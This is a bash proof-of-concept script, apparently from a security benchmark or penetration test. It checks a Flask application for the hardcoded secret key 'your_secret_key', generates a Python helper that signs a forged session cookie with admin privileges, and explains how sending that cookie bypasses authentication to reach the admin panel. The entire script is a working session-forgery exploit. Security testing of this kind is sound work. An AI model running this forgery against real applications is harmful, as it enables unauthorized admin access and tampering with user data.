#!/bin/bash
# POC: Hardcoded Secret Key Session Forgery
# This script demonstrates how an attacker can forge Flask session cookies
# using the hardcoded secret key 'your_secret_key' to gain admin access

set -e

echo "[*] Hardcoded Secret Key Session Forgery POC"
echo "[*] Target: Flask application with hardcoded secret_key = 'your_secret_key'"
echo ""

# Step 1: Verify the hardcoded secret key exists in the source code
echo "[+] Step 1: Checking for hardcoded secret key in source code..."
REPO_PATH="/home/daytona/repo/XBEN-066-24/app/website/app/__init__.py"

if [ -f "$REPO_PATH" ]; then
    if grep -q "app.secret_key = 'your_secret_key'" "$REPO_PATH"; then
        echo "[✓] VULNERABLE: Found hardcoded secret key in $REPO_PATH"
        grep "app.secret_key = 'your_secret_key'" "$REPO_PATH"
    else
        echo "[-] Warning: Secret key pattern not found, checking for variations..."
        grep "secret_key" "$REPO_PATH" || echo "[-] No secret_key found"
    fi
else
    echo "[-] File not found at $REPO_PATH"
    exit 1
fi

echo ""
echo "[+] Step 2: Creating Flask session cookie forgery script..."

# Create a Python script to forge the session cookie
FORGE_SCRIPT="/tmp/forge_session.py"
cat > "$FORGE_SCRIPT" << 'PYTHONEOF'
#!/usr/bin/env python3
import sys
import json
from flask.sessions import SecureCookieSessionInterface
from werkzeug.security import generate_password_hash

# The hardcoded secret key from the vulnerable application
SECRET_KEY = 'your_secret_key'

# Create a session with admin privileges
session_data = {
    'user_id': 1,
    'username': 'admin',
    'is_admin': True,  # This is the critical privilege escalation
}

# Initialize Flask's session interface
session_interface = SecureCookieSessionInterface()

# Generate the forged session cookie
try:
    # Create a mock app context with the secret key
    from flask import Flask
    app = Flask(__name__)
    app.secret_key = SECRET_KEY
    
    with app.app_context():
        from flask.sessions import SecureCookieSession
        session = SecureCookieSession(session_data)
        
        # Sign the session with the app's secret key
        forged_cookie = session_interface.get_signing_serializer(app).dumps(session_data)
        
        print("[✓] Successfully forged session cookie with admin privileges:")
        print("")
        print("Forged Session Cookie:")
        print(forged_cookie)
        print("")
        print("Session data encoded:")
        print(json.dumps(session_data, indent=2))
        print("")
        print("[!] Attack: Send this cookie as 'session' header to the application")
        print("[!] Result: Attacker gains admin access without valid credentials")
        
except Exception as e:
    print(f"[-] Error during forgery: {e}", file=sys.stderr)
    sys.exit(1)
PYTHONEOF

echo "[+] Step 3: Executing session forge script..."
python3 "$FORGE_SCRIPT"

echo ""
echo "[+] Step 4: Demonstrating admin access bypass..."
echo ""
echo "With the forged session cookie, an attacker can:"
echo "  1. Access /admin_panel without valid credentials"
echo "  2. Modify user records and application data"
echo "  3. Bypass all authentication checks"
echo "  4. Execute admin-only functions"
echo ""
echo "[✓] POC Complete: Hardcoded secret key enables complete privilege escalation"
echo ""